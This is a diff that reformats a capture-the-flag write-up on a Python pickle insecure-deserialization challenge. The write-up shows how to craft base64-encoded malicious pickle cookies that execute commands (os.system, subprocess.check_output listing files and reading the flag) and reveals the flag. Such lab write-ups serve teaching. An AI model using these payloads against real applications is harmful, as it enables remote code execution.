@@ -2,19 +2,19 @@
 
 ## Analysis
 
-![](../../.gitbook/assets/image%20%2831%29.png)
+![](<../../.gitbook/assets/image (6).png>)
 
 All the references to **pickles** implies it's an **insecure deserialization** challenge. [`pickle`](https://docs.python.org/3/library/pickle.html) is a serialization format used in python.
 
 If we check the cookies, we get the following:
 
-```text
+```
 plan_b=KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu
 ```
 
 Our guess is that this is a pickled python object, and decoding the base64 seems to imply that to us too:
 
-```text
+```
 $ echo 'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu' | base64 -d
 (dp0
 S'serum'
@@ -48,7 +48,7 @@ serum = pickle.loads(b64decode(code))
 print(serum)
 ```
 
-```text
+```
 $ python3 deserialize.py 
 Traceback (most recent call last):
   File "deserialize.py", line 7, in <module>
@@ -65,7 +65,7 @@ anti_pickle_serum = 'test'
 
 That error is fixed, but there's another one:
 
-```text
+```
 $ python3 deserialize.py 
 Traceback (most recent call last):
   File "deserialize.py", line 8, in <module>
@@ -75,7 +75,7 @@ Traceback (most recent call last):
 TypeError: object.__new__(X): X is not a type object (str)
 ```
 
-Here it's throwing an error because X \(`anti_pickle_serum`\) **is not a type object** - so let's make it a class extending from `object`!
+Here it's throwing an error because X (`anti_pickle_serum`) **is not a type object** - so let's make it a class extending from `object`!
 
 ```python
 # [imports]
@@ -87,7 +87,7 @@ class anti_pickle_serum(object):
 
 And now there's no error, and we get a response!
 
-```text
+```
 $ python3 deserialize.py 
 {'serum': <__main__.anti_pickle_serum object at 0x7f9e1a1b1c40>}
 ```
@@ -115,12 +115,12 @@ print(code)
 
 Here we create the malicious class, then serialize it as part of the dictionary as we saw before.
 
-```text
+```
 $ python3 final.py 
 b'gASVLAAAAAAAAAB9lIwFc2VydW2UjAVwb3NpeJSMBnN5c3RlbZSTlIwGd2hvYW1plIWUUpRzLg=='
 ```
 
-Huh, that looks nothing like the original cookie value \(which starts with `KGRwMApTJ3`\)... maybe we missed something with the `dumps`?
+Huh, that looks nothing like the original cookie value (which starts with `KGRwMApTJ3`)... maybe we missed something with the `dumps`?
 
 Checking out the [`dumps()`](https://docs.python.org/3/library/pickle.html#pickle.dumps) documentation, there is a `protocol` parameter! If we [read a bit deeper](https://docs.python.org/3/library/pickle.html#data-stream-format), this can take a value from `0` to `5`. If we play around, `protocol=0` looks similar to the original cookie:
 
@@ -128,14 +128,14 @@ Checking out the [`dumps()`](https://docs.python.org/3/library/pickle.html#pickl
 code = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
 ```
 
-```text
+```
 $ python3 final.py 
 b'KGRwMApWc2VydW0KcDEKY3Bvc2l4CnN5c3RlbQpwMgooVndob2FtaQpwMwp0cDQKUnA1CnMu'
 ```
 
-Let's change the cookie to this \(without the `b''`\):
+Let's change the cookie to this (without the `b''`):
 
-![](../../.gitbook/assets/image%20%2834%29.png)
+![](<../../.gitbook/assets/image (15).png>)
 
 As you can see now, the value `0` was returned. This is the return value of `os.system`! Now we simply need to find a function that returns the result, and we'll use `subprocess.check_output` for that.
 
@@ -149,14 +149,14 @@ return subprocess.check_output, (['ls'],)
 
 Now run it
 
-```text
+```
 $ python final.py 
 KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydscycKcDQKYXRwNQpScDYKcy4=
 ```
 
 And input it as the cookie.
 
-![](../../.gitbook/assets/image%20%2833%29.png)
+![](<../../.gitbook/assets/image (43).png>)
 
 As can now see that there is a `flag_wIp1b` file, so we can just read it!
 
@@ -166,20 +166,19 @@ While it's tempting to do
 return subprocess.check_output, (['cat flag_wIp1b'],)
 ```
 
-`subprocess.check_output` requires a **list** of parameters \(as we see here\) and the filename is a separate item in the list, like so:
+`subprocess.check_output` requires a **list** of parameters (as we see here) and the filename is a separate item in the list, like so:
 
 ```python
 return subprocess.check_output, (['cat', 'flag_wIp1b'],)
 ```
 
-```text
+```
 $ python final.py 
 KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydjYXQnCnA0CmFTJ2ZsYWdfd0lwMWInCnA1CmF0cDYKUnA3CnMu
 ```
 
 And boom - we get the flag!
 
-![](../../.gitbook/assets/image%20%2832%29.png)
+![](<../../.gitbook/assets/image (33).png>)
 
 `HTB{g00d_j0b_m0rty...n0w_I_h4v3_to_g0_to_f4m1ly_th3r4py..}`
-
